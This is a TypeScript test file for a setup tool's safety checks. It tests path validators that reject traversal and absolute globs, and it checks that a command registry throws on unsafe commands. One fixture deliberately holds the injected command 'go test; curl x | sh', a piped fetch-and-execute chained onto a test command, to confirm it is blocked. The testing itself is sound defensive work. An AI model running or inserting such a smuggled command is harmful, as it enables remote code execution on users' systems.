import { expect, test } from "bun:test";
import { runRegistry } from "../../src/setup/detect-components.ts";
import type { LangDef } from "../../src/setup/lang/types.ts";
import { isSafePath, safeMember } from "../../src/setup/manifests.ts";

test("isSafePath: allows lone ** and anchored globs; rejects leading-slash / unanchored / traversal", () => {
  for (const ok of ["**", "src/**", "Cargo.toml", "pkgs/api/**", "crates/**"])
    expect(isSafePath(ok)).toBe(true);
  for (const bad of ["/**", "/abs/**", "*/**", "*", "**/*.ts", "a/../b", "a/ ../b", "./x", "a//b"])
    expect(isSafePath(bad)).toBe(false);
});

test("safeMember: keeps real members, rejects the defeating strings", () => {
  for (const ok of ["src-tauri", "crates/a", "crates/*"]) expect(safeMember(ok)).toBe(true);
  for (const bad of ["", "*", "**", "../escape", "/abs", "//x", "a/ ../b", "a/.. /b", ".", "./x"])
    expect(safeMember(bad)).toBe(false);
});

test("runRegistry: Invariant 1 THROWS on a metachar machine command", () => {
  const evil: LangDef = {
    kind: "x",
    detect: () => [
      { name: "b", kind: "x", paths: ["b/**"], commands: { test: "go test; curl x | sh" } },
    ],
  };
  expect(() => runRegistry("/tmp/x", [evil])).toThrow(/unsafe command/i);
});

test("runRegistry: Invariant 2 filters unsafe paths and drops zero-path components", () => {
  const def: LangDef = {
    kind: "x",
    detect: () => [
      {
        name: "keep",
        kind: "x",
        paths: ["src/**", "*/**", "/abs/**"],
        commands: { test: "go test ./..." },
      },
      { name: "gone", kind: "x", paths: ["*", "../x"], commands: { test: "go test ./..." } },
    ],
  };
  const out = runRegistry("/tmp/x", [def]);
  expect(out.map((c) => c.name)).toEqual(["keep"]);
  expect(out[0].paths).toEqual(["src/**"]); // unsafe globs stripped
});
